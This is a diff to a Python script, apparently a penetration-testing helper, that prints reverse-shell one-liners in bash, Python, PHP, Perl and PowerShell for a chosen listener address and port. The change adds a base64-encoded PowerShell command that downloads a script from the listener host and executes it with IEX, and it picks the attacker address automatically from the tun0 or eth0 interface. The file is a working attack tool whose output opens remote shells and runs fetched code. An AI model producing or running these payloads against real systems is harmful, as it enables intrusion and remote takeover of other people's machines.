@@ -2,9 +2,10 @@
 
 import sys
 import base64
+import netifaces as ni
 
 def usage():
-    print("Usage: {} [-t <shell_type>] [-i <LHOST>] [-p <LPORT>]".format(sys.argv[0]))
+    print("Usage: {} [-t <shell_type>] [-i <INTERFACE>] [-p <LPORT>] [-f <FILENAME>]".format(sys.argv[0]))
     sys.exit(1)
 
 def generate_bash(LHOST, LPORT):
@@ -35,7 +36,7 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 """.format(LHOST, LPORT, LHOST, LPORT, LHOST, LPORT)
 
 def generate_php(LHOST, LPORT):
-    return r"""
+    return """
 ======================================================================
 [+ PHP]
 php -r '\$sock=fsockopen(\"{}\",{});exec(\"/bin/sh <&3 >&3 2>&3\");'
@@ -66,7 +67,17 @@ $client.Close()'%(LHOST,LPORT)
     encoded_payload = base64.b64encode(payload.encode('utf-16')[2:]).decode()
     return header + prefix + encoded_payload
 
-def generate_payloads(LHOST, LPORT, shell_type):
+def generate_powershell_ref(LHOST, filename):
+    header = """
+======================================================================
+[+ POWERSHELL REF]\n
+"""
+    prefix = "powershell -e "
+    payload = "(New-Object System.Net.WebClient).DownloadString('http://{}/{}') | IEX".format(LHOST, filename)
+    encoded_payload = base64.b64encode(payload.encode('utf-16')[2:]).decode()
+    return header + prefix + encoded_payload
+
+def generate_payloads(LHOST, LPORT, shell_type, filename=None):
     output = ""
     payloads = {
         'bash': generate_bash(LHOST, LPORT),
@@ -74,7 +85,8 @@ def generate_payloads(LHOST, LPORT, shell_type):
         'python': generate_python(LHOST, LPORT),
         'php': generate_php(LHOST, LPORT),
         'perl': generate_perl(LHOST, LPORT),
-        'ps': generate_powershell(LHOST, LPORT)
+        'ps': generate_powershell(LHOST, LPORT),
+        'psref': generate_powershell_ref(LHOST, filename)
     }
     if shell_type != "all":
         return payloads.get(shell_type, "Invalid shell type")
@@ -87,6 +99,8 @@ if __name__ == "__main__":
     LHOST = None
     LPORT = 80
     shell_type = "all"
+    interface = None
+    filename = "RefC.txt"
 
     # Parse the command-line arguments
     i = 1
@@ -95,19 +109,36 @@ if __name__ == "__main__":
             shell_type = sys.argv[i + 1]
             i += 2
         elif sys.argv[i] == '-i':
-            LHOST = sys.argv[i + 1]  # Directly set the LHOST
+            interface = sys.argv[i + 1]
             i += 2
         elif sys.argv[i] == '-p':
             LPORT = int(sys.argv[i + 1])
             i += 2
+        elif sys.argv[i] == '-f':
+            filename = sys.argv[i + 1]
+            i += 2
         else:
             usage()
 
-    # Ensure LHOST is provided
-    if not LHOST:
-        print("Error: No tun0 interface detected, LHOST must be specified using the -i flag.\n e.g. rs -i 192.168.7.1 or rs -i ens18")
-        sys.exit(1)
+    # Determine the LHOST based on the interface
+    if interface:
+        if interface in ni.interfaces():
+            LHOST = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface {interface}")
+        else:
+            print(f"Interface '{interface}' does not exist.")
+            sys.exit(1)
+    else:
+        if 'tun0' in ni.interfaces():
+            LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface tun0")
+        elif 'eth0' in ni.interfaces():
+            LHOST = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
+            print(f"Using IP address {LHOST} from interface eth0")
+        else:
+            print("No valid interface found (tun0 or eth0). Please specify an interface using the -i flag.")
+            sys.exit(1)
 
     # Generate and print payloads based on the given parameters
-    payload = generate_payloads(LHOST, LPORT, shell_type)
+    payload = generate_payloads(LHOST, LPORT, shell_type, filename)
     print(payload)
